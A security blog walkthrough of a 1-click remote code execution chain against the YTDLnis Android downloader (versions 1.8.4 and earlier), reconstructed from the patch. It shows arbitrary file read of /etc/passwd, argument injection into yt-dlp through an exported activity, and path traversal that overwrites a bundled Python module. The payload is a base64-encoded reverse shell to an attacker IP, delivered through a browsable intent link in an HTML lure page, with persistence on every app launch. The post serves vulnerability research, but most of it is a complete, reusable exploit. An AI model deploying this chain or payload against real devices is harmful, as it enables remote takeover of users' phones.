---
layout: post
title: YTDLnis Android 1-Click RCE
date: 2026-05-01
categories:
  - Research
  - Walkthrough
  - Android
tags:
  - Linux
  - Android
  - ADB
  - Intents
  - RCE
  - Python
author: "zerofrost"
image: "/images/YTDLnis/banner.png"
draft: false
---



Recently during my day-to-day Twitter scrolling routine, I came across an interesting vulnerability affecting the Android version of YTDLnis(versions 1.8.4 and prior). YTDLnis is a full-featured audio/video downloader for Android using yt-dlp. The vulnerability was discovered by Paul Gerste from [Sonar](https://www.sonarsource.com/) and does not currently have a CVE assigned to it.  
  
I have always been fascinated by zero-click and 1-click RCEs. The concept of obtaining a shell simply by having someone receive a message or click on a link is mindblowing. This type of vulnerability can be particularly dangerous, as it allows attackers to exploit an application without requiring any user interaction beyond clicking on a malicious link or visiting an attacker-controlled page.  
  
Most 1-click RCEs that you have probably heard of are mostly related to browser exploitation or memory corruption. Other chains that could lead to RCE are intent/deep link injection chains, which [Ken Gannon](https://x.com/Yogehi) has had success with in Pwn2Own several times.

This particular vulnerability lies in the second category and involves chaining together a couple of interesting bugs involving a browsable intent, argument injection, path traversal, and arbitrary file write.  
  
![](/images/YTDLnis/meme.jpeg)  
  
I am usually interested in mobile security, focusing on Android applications, and this vulnerability offered an amazing opportunity for putting my mobile skills to the test. I decided to tackle this vulnerability from a black-box approach with as little knowledge as possible. This involved analyzing the patch implemented to fix the vulnerability, understanding how YTDL works, and eventually building a working proof of concept.  
  
### Patch Diffing  
  
Since we already know that the affected versions are 1.8.4 and below, this means that the patched version is 1.8.5. The release notes for the patched version can be found [here](https://github.com/deniscerri/ytdlnis/releases/tag/v1.8.5).  
  
![](/images/YTDLnis/Pasted%20image%2020260519203000.png)  
  
From the note above, we can see that it highlights the removal of the `COMMAND` argument. Comparing the two versions ([v1.8.4...v1.8.5](https://github.com/deniscerri/ytdlnis/compare/v1.8.4...v1.8.5)) side by side, we can see a list of modified files with diffs telling us exactly which lines were changed.  
  
![](/images/YTDLnis/Pasted%20image%2020260519203641.png)  
  
There are quite a number of files changed. In this case, the easiest route is to use the case-sensitive search option in Firefox to search for all instances of `COMMAND`.  
  
In this [commit](https://github.com/deniscerri/ytdlnis/commit/2433b3768ce6da6202d0ca110af61ec4ae0bf971), we can see the message `remove COMMAND intent argument from ShareActivity due to security vulnerabilities`, affecting `ShareActivity.kt`, which should be the file we are looking for.  
  
![](/images/YTDLnis/Pasted%20image%2020260519205057.png)  
  
Below, we can see the changed lines of code. The `COMMAND` parameter was removed, as well as the lines of code associated with it.  
  
![](/images/YTDLnis/Pasted%20image%2020260519203438.png)  
  
Looking at the `AndroidManifest.xml`, we can see that the activity is exported, which means it may be invoked by external applications or system components, subject to any permission or runtime restrictions enforced by the app.  
  
```xml  
<activity  
android:name=".receiver.ShareActivity"  
android:configChanges="smallestScreenSize|layoutDirection|locale|orientation|screenSize"  
android:excludeFromRecents="true"  
  
android:exported="true" // exported activity  
  
android:taskAffinity=""  
android:launchMode="singleInstance"  
android:theme="@style/Theme.BottomSheet">  
```  
  
Before the removal, we could see that the contents of the `COMMAND` parameter were passed to `downloadItem` as `extraCommands`, after which they were later concatenated into the final `ytdl` command.  
  
```diff  
val inputQuery = data.extractURL()  
  
val type = intent.getStringExtra("TYPE")  
val background = intent.getBooleanExtra("BACKGROUND", false)  
- val command = intent.getStringExtra("COMMAND") ?: ""  
  
lifecycleScope.launch {  
val result: ResultItem  
val existingResults = withContext(Dispatchers.IO){  
resultViewModel.getAllByURL(inputQuery)  
}  
  
if (existingResults.isEmpty() || existingResults.size > 1) {  
resultViewModel.deleteAll()  
result = downloadViewModel.createEmptyResultItem(inputQuery)  
}else{  
result = existingResults.first()  
}  
  
val downloadType = DownloadViewModel.Type.valueOf(type ?: downloadViewModel.getDownloadType(url = result.url).toString())  
if (sharedPreferences.getBoolean("download_card", true) && !background){  
val bundle = Bundle()  
bundle.putParcelable("result", result)  
bundle.putSerializable("type", downloadType)  
navController.setGraph(R.navigation.share_nav_graph, bundle)  
}else{  
lifecycleScope.launch(Dispatchers.IO){  
val downloadItem = downloadViewModel.createDownloadItemFromResult(  
result = result,  
givenType = downloadType)  
  
- if (downloadType == DownloadViewModel.Type.command && command.isNotBlank()){  
- downloadItem.format.format_note = command  
- }else{  
- downloadItem.extraCommands = downloadItem.extraCommands + " $command"  
- }  
downloadViewModel.queueDownloads(listOf(downloadItem))  
}  
this@ShareActivity.finish()  
}  
}  
}  
}  
override fun onConfigurationChanged(newConfig: Configuration) {  
startActivity(Intent(this, MainActivity::class.java))  
super.onConfigurationChanged(newConfig)  
}  
```
### Abusing yt-dlp Features  
  
The Kotlin application makes use of a Python library called `yt-dlp`, which can be found on GitHub. To better understand the additional command-line arguments passed to the application, we can install it locally and explore its help menu.  
  
![](/images/YTDLnis/Pasted%20image%2020260519205353.png)  
  
Installation is quite straightforward on Ubuntu.  
  
![](/images/YTDLnis/Pasted%20image%2020260519210921.png)  
  
Once installed, we can explore the help menu.  
  
![](/images/YTDLnis/Pasted%20image%2020260519211059.png)  
  

  
#### Arbitrary Read
##### Batch File
The help menu contains some interesting options related to file operations. Take `--batch-file` for instance, we could abuse it to read arbitrary files.
```c
 Filesystem Options:
    -a, --batch-file FILE                                File containing URLs to download ("-" for stdin), one URL per line.
                                                         Lines starting with "#", ";" or "]" are considered as comments and
                                                         ignored
```

Below is a poc for reading `/etc/passwd`
```c
rangeadmin@ubuntu01 /tmp [1]> yt-dlp -a /etc/passwd
[generic] Extracting URL: root:x:0:0:root:/root:/bin/bash
[generic] bash: Downloading webpage
ERROR: Unable to handle request: Unsupported url scheme: "root" (urllib)
[generic] Extracting URL: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[generic] nologin: Downloading webpage
ERROR: Unable to handle request: Unsupported url scheme: "daemon" (urllib)
[generic] Extracting URL: bin:x:2:2:bin:/bin:/usr/sbin/nologin
[generic] nologin: Downloading webpage
ERROR: Unable to handle request: Unsupported url scheme: "bin" (urllib)
[generic] Extracting URL: sys:x:3:3:sys:/dev:/usr/sbin/nologin
[generic] nologin: Downloading webpage
ERROR: Unable to handle request: Unsupported url scheme: "sys" (urllib)
[generic] Extracting URL: sync:x:4:65534:sync:/bin:/bin/sync
[generic] sync: Downloading webpage
ERROR: Unable to handle request: Unsupported url scheme: "sync" (urllib)
[generic] Extracting URL: games:x:5:60:games:/usr/games:/usr/sbin/nologin

```

The output can be cleaned up using grep and awk commands
```c
$ rangeadmin@ubuntu01 /tmp> yt-dlp -a /etc/passwd 2>&1 |grep Extracting| awk -F 'Extracting URL: ' '{print $2}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

```

##### Cookie File
The same case applies with the `--cookies` option.
```c
 --cookies FILE                                       Netscape formatted file to read cookies from and dump cookie jar in
```

By setting an arbitrary file we want to read as the cookie file, we can read its contents
![](/images/YTDLnis/Pasted%20image%2020260519211925.png)


#### Arbitrary Write  
  
With the ability to read files,  we can also look for options that we can use to write files.
```c
-o, --output [TYPES:]TEMPLATE                        Output filename template; see "OUTPUT TEMPLATE" for details
```

The `--print` option allows us to print arbitrary content on the screen. However we need to specify the url when using the option, for this we can use any url we want.
```c
rangeadmin@ubuntu01 /tmp> yt-dlp --print 'arb write' https://oracleupdates.requestcatcher.com/q.mp4
WARNING: [generic] Falling back on generic information extractor
WARNING: [generic] URL could be a direct video link, returning it as such.
arb write
```

There is also another option `--print-to-file` which allows us to specify where our content will be written
```c
rangeadmin@ubuntu01 /tmp> yt-dlp --print-to-file 'arb write' /tmp/file.txt https://oracleupdates.requestcatcher.com/q.mp4
[generic] Extracting URL: https://oracleupdates.requestcatcher.com/q.mp4
[generic] q: Downloading webpage
WARNING: [generic] Falling back on generic information extractor
WARNING: [generic] URL could be a direct video link, returning it as such.
[info] q: Downloading 1 format(s): 0
[info] Writing 'arb write' to: /tmp/file.txt
[download] q [q].mp4 has already been downloaded
[download] 100% of     14.00B
rangeadmin@ubuntu01 /tmp> 

```

![](/images/YTDLnis/Pasted%20image%2020260519213551.png)


Now that we have found a gadget to write arbitrary files, our `COMMAND` parameter will be as follows
```c
--print-to-file 'arb write' /data/local/tmp/pwned.txt https://dummy.url/f.mp4
```


### ADB Testing  
  
At this point, we can begin tying the pieces together by interacting with the vulnerable activity over ADB. Relevant snippets from `ShareActivity.kt`:  
```kotlin

val action = intent.action
Log.e("aa", intent.toString())

// Make sure action is SEND or action is VIEW
if (Intent.ACTION_SEND == action || Intent.ACTION_VIEW == action) {

		// if the action is SEND and string extra is null, call the Main Activity
		if (intent.getStringExtra(Intent.EXTRA_TEXT) == null && Intent.ACTION_SEND == action){
			intent.setClass(this, MainActivity::class.java)
			startActivity(intent)
			finishAffinity()
			return
		}

		runCatching { supportFragmentManager.popBackStack() }

		// Set booleanextra with --ez, use --es for stringextra
		quickDownload = intent.getBooleanExtra("quick_download", sharedPreferences.getBoolean("quick_download", false) || sharedPreferences.getString("preferred_download_type", "video") == "command")
		val data = when(action){
			Intent.ACTION_SEND -> intent.getStringExtra(Intent.EXTRA_TEXT)!!
			else -> intent.dataString!!
		}
		// set data with -d
		val inputQuery = data.extractURL()

		val type = intent.getStringExtra("TYPE")
		val background = intent.getBooleanExtra("BACKGROUND", false)
		val command = intent.getStringExtra("COMMAND") ?: ""


			...SNIP....

		if (downloadType == DownloadViewModel.Type.command && command.isNotBlank()){
			downloadItem.format.format_note = command
		}else{
			downloadItem.extraCommands = downloadItem.extraCommands + " $command"
		}
		downloadViewModel.queueDownloads(listOf(downloadItem))
	}

```


> The `type` option allows us to specify whether to download the video/audio. The `Background` option determines whether the user will be prompted during download.


We can test the arbitrary write via ADB as follows 
```c
adb shell am start -n com.deniscerri.ytdl/.receiver.ShareActivity -a android.intent.action.VIEW  -d "https://oracleupdates.requestcatcher.com/$RANDOM.mp4" --ez quick_download true --es TYPE video --ez BACKGROUND true --es COMMAND "--print-to-file\ a-b\ qqqq"
```

![](/images/YTDLnis/Pasted%20image%2020260521225527.png)


We can see that our content was successfully written to an arbitrary file at the path `/storage/emulated/0/Download/YTDLnis/qqqq`

> A point to note is that, when  writing to a file, content is appended and not replaced.


Now that we have verified the arbitrary file write vulnerability, we now need to figure out what payload to write and where to write it, to get RCE. Looking at some of the files in the application's folder, we find some python files.
![](/images/YTDLnis/Pasted%20image%2020260521231525.png)
![](/images/YTDLnis/Pasted%20image%2020260521231609.png)

#### Setting the Stage
This application ships with `python3.11` because the application relies on the `yt-dlp` library which is written in python. This creates a good attack surface that we could leverage for RCE. By writing to a python file here, we could overwrite a file to contain our malicious payload, which would then trigger a reverse shell.

Therefore, we can start preparing a python payload for use. Initially, I tried to use the following payload format, which did not work for some reason. 
```c
import os;os.system("echo some_random_base64_here=|base64 -d|sh")
```

As a result, I ended up using a python reverse shell, which I then encoded as base64 to avoid issues in escaping quotes
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

base64 encoded
```c
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==
```

Python code to decode and execute the reverse shell
```c
exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==").decode())
```

Below is the final Adb command.
```c
adb shell 'am start -n com.deniscerri.ytdl/.receiver.ShareActivity -a android.intent.action.VIEW -d "https://oracleupdates.requestcatcher.com/$RANDOM.mp4" --ez quick_download true --es TYPE video --ez BACKGROUND true --es COMMAND "--print-to-file '\''exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==\").decode());'\'' fffff"'				
```
![](/images/YTDLnis/Pasted%20image%2020260521233258.png)

Excellent! We can see that our payload was successfully written to our file.

### Path Traversal  
Now that our payload was written to our file without any issues, The next step is to find a python file to write. However, our files are written to `/storage/emulated/0/Download/YTDLnis/Video` and we need to write to `/data/data/com.deniscerri.ytdl/no_backup`. If we used an absolute path, we would end up trying to write to `/storage/emulated/0/Download/YTDLnis/Video//storage/emulated/0/Download/YTDLnis/Video` , since the application may try to concatenate the two paths. Our solution for this, path traversal. We can traversal back using `../../` to make the path `/storage/emulated/0/Download/YTDLnis/Video/../../../../../../../../../../../../../../data/data/com.deniscerri.ytdl/no_backup/somefile.txt`

  
### Picking a Target  
Now for the final part of the exploit, we need to find a python file to overwrite. The file we pick should be a file that is used regularly by the application. The more the file is used, the higher the success rate of our python code being executed.

After looking around the python code base, One module was imported quite a number of times i.e  `import re`, which made it an ideal target. Therefore, I chose to target the file `/data/data/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py`, which is executed when the `re` module is imported. 

Let's add it to our chain
```c
adb shell 'am start -n com.deniscerri.ytdl/.receiver.ShareActivity -a android.intent.action.VIEW -d "https://oracleupdates.requestcatcher.com/$RANDOM.mp4" --ez quick_download true --es TYPE video --ez BACKGROUND true --es COMMAND "--print-to-file '\''exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==\").decode());'\'' ../../../../../../../../../../../../../../data/data/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py"'			
```

> Another interesting approach would be creating a [.pth](https://medium.com/@muspi-merol/the-secret-power-of-pythons-pth-files-beyond-path-hacking-3b5698e4f15a) file. A `.pth` file is a plain text file that you place in your `site-packages` directory. When Python starts up, it parses the content of each .pth, line by line.


Below is a demo of our POC 
![](/images/YTDLnis/file.gif)


When the POC runs, three things happen
![](/images/YTDLnis/Pasted%20image%2020260521235007.png)


### 1-Click RCE
We finally have a POC that spawns a shell, but we won't tell our victim to execute the ADB command now, will we? In our attack scenario, we are only allowed to deliver a malicious link to the victim, which they will happily click, bringing us to our next part. 

Looking at the activity `ShareActivity`, we can see these parts `<action android:name="android.intent.action.VIEW" />` and `<category android:name="android.intent.category.BROWSABLE" />`

`android.intent.category.BROWSABLE` is an Android intent category that tells the system: `This activity is safe to launch from a web browser or external source.`

```xml
<activity
            android:name=".receiver.ShareActivity"
            android:configChanges="smallestScreenSize|layoutDirection|locale|orientation|screenSize"
            android:excludeFromRecents="true"
            android:exported="true"
            android:taskAffinity=""
            android:launchMode="singleInstance"
            android:theme="@style/Theme.BottomSheet">
            <intent-filter>
                <action android:name="android.intent.action.SEND" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="text/plain" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />

                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />

                <data android:scheme="http" />
                <data android:scheme="https" />
                <data android:mimeType="video/*" />
                <data android:mimeType="audio/*" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="https" android:host="youtube.com" />
                <data android:host="youtube.com" />
            </intent-filter>

			....SNIP....


        </activity>

```


> Only activities with the category filter, [android.intent.category.BROWSABLE](http://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE) can be invoked using this method, as it indicates that the application is safe to open from the Browser.


From the [documentation](https://developer.chrome.com/docs/android/intents), we see that we can launch apps directly from a web page on an Android device with an [Android Intent](http://developer.android.com/guide/components/intents-filters). You can implement a user gesture to launch the app with a custom scheme or use the `intent:` syntax. Below is an example
```c
intent:  
   HOST/URI-path // Optional host  
   #Intent;  
      package=\[string\];  
      action=\[string\];  
      category=\[string\];  
      component=\[string\];  
      scheme=\[string\];  
   end;
W
```

Below is a table that shows how we would represent `getStringExtra, getBooleanExtra` etc, with some examples 


| Data Type   | Intent URL Prefix Example                     |
| ----------- | --------------------------------------------- |
| **String**  | `S.browser_fallback_url=http%3A%2F%2Fx.yz`      |
| **Boolean** | `B.BACKGROUND_MODE=true`                        |
| **Integer** | `i.view_columns=3`                             |
| **Long**    | `l.album_id=9876543210`                         |
| **Float**   | `f.playback_speed=1.5`                          |





We can also represent the above in one line. For example, starting a youtube video download would be represented as follows. 
```c
intent://youtube.com/watch?v=dQw4w9WgXcQ#Intent;scheme=https;package=com.deniscerri.ytdl;action=android.intent.action.VIEW;S.quick_download=true;S.TYPE=video;end
```


For our exploit, we need our browsable intent to have the following format
```c
intent://youtube.com/watch?v=tPEE9ZwTmy0#Intent;scheme=https;package=com.deniscerri.ytdl;B.BACKGROUND=true;B.quick_download=true;S.TYPE=audio;S.COMMAND=<payload_here>;end
```

We want the `COMMAND` parameter to contain the following
```c
--print-to-file 'exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==").decode());' ../../../../../../../../../../../../../../data/user/0/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py
```

Since browsable intents are similar to urls, we need to URL encode our payload to the following
```c
--print-to-file%20'exec%28__import__%28%22base64%22%29.b64decode%28%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%22%29.decode%28%29%29%3B'%20../../../../../../../../../../../../../../data/user/0/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py
```

Our updated intent
```c
intent://youtube.com/watch?v=tPEE9ZwTmy0#Intent;scheme=https;package=com.deniscerri.ytdl;B.BACKGROUND=true;B.quick_download=true;S.TYPE=audio;S.COMMAND=--print-to-file%20'exec%28__import__%28%22base64%22%29.b64decode%28%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%22%29.decode%28%29%29%3B'%20../../../../../../../../../../../../../../data/user/0/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py;end
```


The final step is starting a simple python server to serve our malicious link via a html file. You can add some text to entice the victim to click our link. Save the following file as `index.html`
```html
   <a href="intent://youtube.com/watch?v=tPEE9ZwTmy0#Intent;scheme=https;package=com.deniscerri.ytdl;B.BACKGROUND=true;B.quick_download=true;S.TYPE=audio;S.COMMAND=--print-to-file%20'exec%28__import__%28%22base64%22%29.b64decode%28%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%22%29.decode%28%29%29%3B'%20../../../../../../../../../../../../../../data/user/0/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py;end">
    Download More RAM
  </a>
```

Serve it via a python server
```c
python3 -m http.server 3030
```



Confirm the version
![](/images/YTDLnis/Pasted%20image%2020260520234814.png)

Visit `http://192.168.0.102:3030` to view the link. 
![](/images/YTDLnis/Pasted%20image%2020260520234844.png)

Clicking the link spawns a shell on our attacker device
![](/images/YTDLnis/Pasted%20image%2020260520235654.png)



Since we compromised the `re` module by adding malicious code to spawn a reverse shell, every time the app launches , we will get a reverse shell on our attacker machine, which establishes persistence for our attack.



### References
* https://www.sonarsource.com/blog/ytdlnis-argument-injection-rce?utm_medium=social&utm_source=twitter&utm_campaign=research&utm_content=social-ytdlnis-rce-260324-&utm_term=---&s_category=Organic&s_source=Social%20Media&s_origin=social
* https://developer.chrome.com/docs/android/intents
